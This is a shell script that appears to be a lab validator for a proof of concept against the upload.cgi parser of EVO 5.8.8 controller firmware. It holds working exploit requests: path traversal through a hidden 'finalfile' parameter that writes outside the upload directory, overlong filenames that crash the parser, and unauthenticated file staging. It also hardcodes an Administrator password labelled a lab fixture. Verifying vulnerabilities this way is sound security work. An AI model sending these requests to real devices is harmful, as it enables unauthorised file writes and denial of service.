#!/bin/sh
# PoC33 validator: genuine EVO 5.8.8 i686 upload.cgi multipart parser.
#   1. Hidden "finalfile" query parameter escapes the upload directory
#      (parameters flow writes attacker-controlled plaintext).
#   2. Overlong multipart filename crashes the setuid parser (DoS only).
#   3. Unauthenticated "evoupfile" parts persist in /opt/tmp/upl, with
#      basename containment (no traversal).
# Runs inside the network-disabled bubblewrap/QEMU lab. All writes stay in
# disposable runtime storage (/tmp, /opt/tmp, /dev/shm, /var/log) and are
# removed on exit. No physical controller or external network is used.
set -u

BB=/bin/busybox
BASE=http://127.0.0.1:18082/cgi-bin
BLOG=/var/log/lighttpd/breakage.log
BND=----evopoc33boundary
WORK=/tmp/poc33-work
CANARY=/tmp/poc33-escape-canary.txt
ESC_TRAP=/tmp/poc33-should-not-escape.evo
UPL=/opt/tmp/upl
SERVER_PID=
AUTH=
FAILS=0

cleanup() {
  set +e
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  rm -rf "$WORK"
  rm -f "$CANARY" "$ESC_TRAP"
  rm -f "$UPL"/poc33-staged.evo "$UPL"/poc33-should-not-escape.evo \
        "$UPL"/poc33-src.par "$UPL"/poc33-plain.par "$UPL"/POC33*
}
trap cleanup EXIT INT TERM

report() { # $1=name $2=0-pass/1-fail
  if [ "$2" -eq 0 ]; then echo "PASS $1"; else echo "FAIL $1"; FAILS=$((FAILS + 1)); fi
}

mp() { # $1=field $2=filename $3=outfile
  {
    printf -- '--%s\r\n' "$BND"
    printf 'Content-Disposition: form-data; name="%s"; filename="%s"\r\n' "$1" "$2"
    printf 'Content-Type: application/octet-stream\r\n\r\n'
    printf 'POC33-PLAINTEXT-CANARY\n'
    printf '\r\n--%s--\r\n' "$BND"
  } > "$3"
}

post() { # $1=query $2=bodyfile; sets RESP ST HTTP
  $BB wget -S -q -O "$WORK/resp" \
    --header "Content-Type: multipart/form-data; boundary=$BND" \
    --post-file "$2" "$BASE/upload.cgi?$1" 2>"$WORK/werr"
  ST=$?
  RESP=$($BB head -c 200 "$WORK/resp" 2>/dev/null | $BB tr -d '\r\n')
  HTTP=$($BB grep -m1 'HTTP/1.1' "$WORK/werr" | $BB tr -d '\r')
}

sig11_count() {
  c=$($BB grep -c 'SIG: 11' "$BLOG" 2>/dev/null)
  echo "${c:-0}"
}

mkdir -p "$WORK"
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
  if SYSINFO=$($BB wget -qO- "$BASE/sysinfo.lua" 2>/dev/null); then break; fi
  sleep 1
done
case "$SYSINFO" in
  *'"status":"ok"'*'5.8.8.'*) ;;
  *) echo "FAIL genuine 5.8.8 sysinfo: $SYSINFO"; exit 1 ;;
esac
echo "PASS genuine x86 5.8.8 service"

# --- F4: unauthenticated evoupfile staging persists, basename-contained ---
mp evoupfile poc33-staged.evo "$WORK/b1"
post "" "$WORK/b1"
T=1
case "$RESP" in *'"e":2'*) T=0;; esac
[ -f "$UPL/poc33-staged.evo" ] || T=1
$BB grep -q POC33-PLAINTEXT-CANARY "$UPL/poc33-staged.evo" 2>/dev/null || T=1
report "unauthenticated evoupfile denied ($RESP) yet staged plaintext in /opt/tmp/upl" $T

mp evoupfile ../../../tmp/poc33-should-not-escape.evo "$WORK/b2"
post "" "$WORK/b2"
T=0
[ -e "$ESC_TRAP" ] && T=1
[ -f "$UPL/poc33-should-not-escape.evo" ] || T=1
report "pre-auth staging filename traversal contained to basename" $T

# --- authentication fixture (lab-only credential) ---
AUTH_RESPONSE=$($BB wget -qO- --post-data 'action=authenticate&username=Administrator&password=O0ANI3' "$BASE/api.lua")
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL Administrator authentication: $AUTH_RESPONSE"; exit 1 ;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
echo "PASS Administrator authentication (lab fixture)"

# --- F1 negative control: hidden finalfile without a session ---
mp file poc33-src.par "$WORK/b3"
post "action=upload&path=parameters&finalfile=../../../tmp/poc33-escape-canary.txt" "$WORK/b3"
T=1
case "$RESP" in *'"e":2'*) T=0;; esac
[ -e "$CANARY" ] && T=1
report "finalfile escape denied without session ($RESP)" $T

# --- F1: hidden finalfile escapes upload dir with plaintext ---
post "SSES=$AUTH&action=upload&path=parameters&finalfile=../../../tmp/poc33-escape-canary.txt" "$WORK/b3"
T=1
case "$RESP" in *'"e":0'*) T=0;; esac
$BB grep -q POC33-PLAINTEXT-CANARY "$CANARY" 2>/dev/null || T=1
report "authenticated finalfile writes plaintext outside upload dir ($RESP)" $T

# --- F1 intended-behavior control: plain finalfile stays inside ---
post "SSES=$AUTH&action=upload&path=parameters&finalfile=poc33-plain.par" "$WORK/b3"
T=1
case "$RESP" in *'"e":0'*) T=0;; esac
[ -f "$UPL/poc33-plain.par" ] || T=1
report "plain finalfile stays inside /opt/tmp/upl ($RESP)" $T

# --- F2 control: 64-char filename accepted ---
FN64=POC33
while [ ${#FN64} -lt 60 ]; do FN64=${FN64}A; done
FN64=$FN64.txt
mp file "$FN64" "$WORK/b4"
post "SSES=$AUTH&action=upload&path=parameters" "$WORK/b4"
T=1
case "$RESP" in *'"e":0'*) T=0;; esac
report "64-char filename accepted ($RESP)" $T

# --- F2: 72-char filename crashes the parser (DoS only) ---
FN72=POC33
while [ ${#FN72} -lt 68 ]; do FN72=${FN72}A; done
FN72=$FN72.txt
mp file "$FN72" "$WORK/b5"
SIGS_BEFORE=$(sig11_count)
post "SSES=$AUTH&action=upload&path=parameters" "$WORK/b5"
SIGS_AFTER=$(sig11_count)
T=0
[ "$ST" -eq 0 ] && T=1
case "$HTTP" in *' 500 '*) ;; *) T=1;; esac
[ "$SIGS_AFTER" -gt "$SIGS_BEFORE" ] || T=1
report "72-char filename crashes parser (HTTP 500, SIGSEGV logged)" $T

# --- parser crash does not take down the service ---
if $BB wget -qO- "$BASE/sysinfo.lua" >/dev/null 2>&1; then
  report "service survives parser crash" 0
else
  report "service survives parser crash" 1
fi

if [ "$FAILS" -eq 0 ]; then
  echo "overall: PASS"
else
  echo "overall: FAIL ($FAILS failures)"
fi
[ "$FAILS" -eq 0 ]
